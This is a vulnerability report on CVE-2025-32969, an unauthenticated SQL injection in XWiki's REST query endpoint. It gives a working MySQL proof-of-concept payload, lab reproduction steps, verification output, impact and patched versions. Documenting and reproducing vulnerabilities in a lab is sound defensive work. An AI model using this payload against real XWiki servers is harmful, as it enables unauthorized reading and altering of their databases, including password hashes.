# CVE-2025-32969 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-32969
- **Vulnerability Type**: SQL Injection (CWE-89)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: XWiki Platform
- **Affected Versions**: 1.8 to < 15.10.16, < 16.4.6, < 16.10.1

## Vulnerability Description
XWiki's REST API query endpoint (`/rest/wikis/xwiki/query`) contains a SQL injection vulnerability that allows unauthenticated remote attackers to escape from the HQL (Hibernate Query Language) execution context and execute arbitrary SQL statements on the database backend.

## Technical Details

### Vulnerable Endpoint
```
GET /rest/wikis/xwiki/query?q={payload}&type=hql&distinct=0
```

### Attack Vector
The vulnerability exists in the query parameter `q` where user input is not properly sanitized. By using specific Java class references (e.g., `org.apache.logging.log4j.util.Chars.SPACE`) combined with SQL injection techniques, an attacker can break out of the HQL context and inject raw SQL.

### Proof of Concept Payload (MySQL)
```
where doc.name=length('a')*org.apache.logging.log4j.util.Chars.SPACE or 1<>'1\'' union select 1,2,3,sleep(5) #'
```

This payload:
1. Uses `org.apache.logging.log4j.util.Chars.SPACE` to manipulate the query
2. Escapes from HQL context using `1<>'1\''`
3. Injects a UNION SELECT with `sleep(5)` to demonstrate time-based blind SQL injection

## Impact
- **Confidentiality**: Attackers can extract sensitive data including password hashes
- **Integrity**: Attackers can execute UPDATE/INSERT/DELETE queries
- **Availability**: Attackers can potentially cause denial of service
- **Authentication Bypass**: Works even when "Prevent unregistered users" options are enabled

## Reproduction Steps

1. Deploy vulnerable XWiki version (e.g., 16.10.0) using Docker:
   ```bash
   docker-compose up -d
   ```

2. Wait for XWiki initialization to complete (may take several minutes)

3. Execute the PoC:
   ```bash
   python poc.py -u http://localhost:8080
   ```

4. Observe the response delay (~5 seconds) confirming SQL injection

## Verification Results
```
[*] Target: http://localhost:8080
[*] Testing SQL injection with sleep(5)...
[*] Response status: 200
[*] Response time: 5.13 seconds
[+] VULNERABLE! SQL injection confirmed (response delayed by ~5s)
[+] CVE-2025-32969: XWiki REST API SQL Injection
```

## Remediation
Upgrade XWiki to one of the patched versions:
- 15.10.16 or later
- 16.4.6 or later
- 16.10.1 or later

## References
- https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-x9mj-h6c5-mwhm
- https://nvd.nist.gov/vuln/detail/CVE-2025-32969
